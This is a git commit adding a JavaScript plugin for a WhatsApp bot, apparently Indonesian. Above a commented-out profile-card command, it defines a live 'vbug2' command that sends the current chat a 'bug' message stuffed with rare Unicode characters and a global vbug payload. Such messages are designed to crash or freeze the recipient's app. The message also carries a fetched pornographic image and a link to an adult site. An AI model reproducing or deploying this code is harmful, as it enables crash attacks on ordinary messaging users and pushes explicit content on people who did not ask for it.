35fee8333ff06df77843d7d156dc7164001e0014
FairusAnjayy <94828449+FairusAnjay@users.noreply.github.com>
2022-10-30 02:35:53 +0700

    Add files via upload

---
+++ plugins/vbugg.js
@@ -0,0 +1,46 @@
+/*let handler = async m => {
+
+let krtu = `Kartu Intro`
+m.reply(`
+0ཻུ۪۪ꦽꦼ̷⸙‹•══════════════♡᭄
+│       *「 Kartu Intro 」*
+│ *Nama     :* 
+│ *Gender   :* 
+│ *Umur      :* 
+│ *Hobby    :* 
+│ *Kelas      :* 
+│ *Asal         :* 
+│ *Agama    :* 
+|  *Status     :* 
+╰═════ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙
+`.trim()) // Tambah sendiri kalo mau
+}
+handler.command = /^(intro)$/i
+
+export default handler */
+
+import fetch from 'node-fetch'
+let handler = async(m, { conn, text, usedPrefix, command }) => {
+let pp = await conn.profilePictureUrl(m.chat).catch(_ => null)
+
+let krtu = `FrzXD!!`     𠀋𠄘𠇲"        
+                           ...e outros 996144 caracteres     
+                           ${global.vbug} ${global.vbug}
+`
+let wibu = `https://api.waifu.pics/nsfw/blowjob` 
+let thumb = await(await fetch(wibu)).buffer()
+conn.sendButtonDoc(m.chat, krtu, wm,'666','.menu', m, { contextInfo: { externalAdReply: { showAdAttribution: true,
+    mediaUrl: "https://Instagram.com/fairuzzgapunyaduit",
+    mediaType: "VIDEO",
+    description: "https://xnxx.com/", 
+    title: '𠀋𠀾𠂊𠄘𠇲𠀋𠀾𠂊𠄘𠇲',
+    body: wm,
+    thumbnail: thumb,
+    sourceUrl: sgc
+  }
+  } }) // Tambah sendiri kalo mau
+}
+handler.command = /^(vbug2)$/i
+
+export default handler
+
